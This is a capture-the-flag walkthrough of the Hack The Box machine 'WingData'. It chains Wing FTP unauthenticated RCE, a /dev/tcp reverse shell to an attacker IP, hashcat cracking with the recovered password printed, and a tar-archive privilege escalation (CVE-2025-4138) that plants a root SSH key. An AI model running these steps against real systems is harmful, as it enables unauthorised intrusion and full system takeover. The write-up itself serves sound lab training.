# WingData HTB - Walkthrough

This document describes the full exploitation path for the WingData machine.

---

##  Enumeration

### Nmap Scan

```bash
nmap -sC -sV -Pn -p- <TARGET_IP>
```

### Results

* 22/tcp → SSH (OpenSSH 9.2p1)
* 80/tcp → HTTP (Apache 2.4.66)

### Initial Insight

* Only HTTP is accessible without credentials
* Focus shifts to web enumeration

---

##  Web Enumeration

Using Burp Suite, the following subdomain was discovered:

```bash
ftp.wingdata.htb
```

This indicates a possible FTP web interface.

---

##  Directory Fuzzing

```bash
ffuf -u http://ftp.wingdata.htb/FUZZ -w <WORDLIST> -fc 404
```

### Findings

* Multiple endpoints returning **500 errors**
* Suggests backend misconfiguration or vulnerability

---

##  Exploit Discovery

```bash
searchsploit wing ftp
```

### Key Finding

* Wing FTP Server 7.4.3 - Unauthenticated RCE

 This becomes the primary attack vector

---

##  Initial Access (RCE)

Test command execution:

```bash
python3 wingftp_rce.py -u http://ftp.wingdata.htb -c id
```

### Output

```bash
uid=1000(wingftp)
```

Confirmed remote command execution.

---

##  Reverse Shell

### Create shell

```bash
bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
```

### Start server

```bash
python3 -m http.server 80
```

### Execute payload

```bash
python3 wingftp_rce.py -u http://ftp.wingdata.htb -c "bash /tmp/shell.sh"
```

### Result

* Shell obtained as user: `wingftp`

---

##  User Access

During enumeration, a password hash for user `wacky` was found.

### Crack hash

```bash
hashcat -m 1400 -a 6 wacky.hash rockyou.txt WingFTP
```

### Result

```bash
!#7Blushing^*Bride5WingFTP
```

---

### SSH Login

```bash
ssh wacky@<TARGET_IP>
```

* Successfully logged in
* Retrieved `user.txt`

---

##  Privilege Escalation

### Technique

Abuse of vulnerable backup restore mechanism (CVE-2025-4138)

---

### Generate SSH key

```bash
ssh-keygen -t ed25519 -f ~/.ssh/wingdata_key
```

---

### Create malicious archive

```bash
python3 tar_privesc_cve_2025_4138.py \
  --preset ssh-key \
  --payload ~/.ssh/wingdata_key.pub \
  --tar-out backup.tar
```

---

### Move archive

```bash
mv backup.tar /opt/backup_clients/backups/
```

---

### Trigger restore

```bash
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup.tar -r restore_pwn
```

---

### Root Access

```bash
ssh -i ~/.ssh/wingdata_key root@127.0.0.1
```

* Root shell obtained
* Retrieved `root.txt`

---

##  Summary

### Attack Chain

1. Web enumeration → discover `ftp.wingdata.htb`
2. Exploit Wing FTP → RCE as `wingftp`
3. Reverse shell → system access
4. Hash cracking → SSH access as `wacky`
5. Tar exploit → privilege escalation to root

---

##  Notes

* Multiple vulnerabilities chained together
* Realistic exploitation scenario
* Good example of:

  * Web exploitation
  * Credential recovery
  * Privilege escalation

---

##  Final Result

* User access 
* Root access 
* Full compromise of the system
